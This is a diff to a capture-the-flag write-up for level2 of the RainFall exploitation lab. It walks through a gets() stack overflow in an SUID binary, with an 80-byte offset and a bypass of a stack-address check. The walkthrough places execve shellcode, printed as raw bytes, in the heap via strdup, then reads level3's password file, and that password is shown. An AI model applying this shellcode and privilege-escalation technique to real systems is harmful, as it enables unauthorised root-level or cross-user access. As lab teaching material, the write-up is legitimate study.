@@ -1,3 +1,21 @@
+We get in the level2, then we list the files in the home directory:
+
+```
+   level2@RainFall:~$ ls -la
+   -rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
+```
+The binary is owned by level3 and has the SUID bit set, meaning if it executes any shell, it will run with level3's privileges.
+
+We try to execute the binary file to get an idea of what it does exactly
+```
+   level2@RainFall:~$ ./level2 
+   sadasjdhasjdgasjhdjhasdjhashghdjashdjhasjdhsakjdhaskjhdkjahdakjsdhkjashdasjhdjaskhdjashdkjashdasjhdjasdhjashdjashdjashdaskjdas
+   sadasjdhasjdgasjhdjhasdjhashghdjashdjhasjdhsakjdhaskjhdkjahdakjskhdjashdasjhdjaskhdjashdkjashdasjhdjasdhjashdjashdjashdaskjdas
+   Segmentation fault (core dumped)
+```
+
+We decompile the binary to get the source code;
+
 The function gets(buf) does not check input size (stack buffer overflow).
 
 ```
@@ -39,7 +57,7 @@ We use a pattern to crash the program and find the exact offset to the return ad
 
 The offset to overwrite the return address is 80 bytes.
 
-the problem here is that It checks if the return address points to the stack (which often starts at 0xb... on Linux/x86).
+the problem here is that it checks if the return address points to the stack (which often starts at 0xb... on Linux/x86).
 
 ```
    if (((unsigned long)return_address & 0xB0000000) != 0xB0000000) 
@@ -49,7 +67,7 @@ the problem here is that It checks if the return address points to the stack (wh
    }
 ```
 
-so we gone try to Put shellcode in the heap (via strdup(input)), And redirecting execution to that heap address.
+so we will try to Put shellcode in the heap (via strdup(input)), And redirecting execution to that heap address.
 
 ```
 shellcode="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
@@ -83,4 +101,13 @@ so the address of strdup is 0x0804a008 in little-indian \x08\xa0\x04\x08
    level3
    cat /home/user/level3/.pass
    492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+
+We jump to level3
+
+```
+level2@RainFall:~$ su level3
+Password:492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
 ```
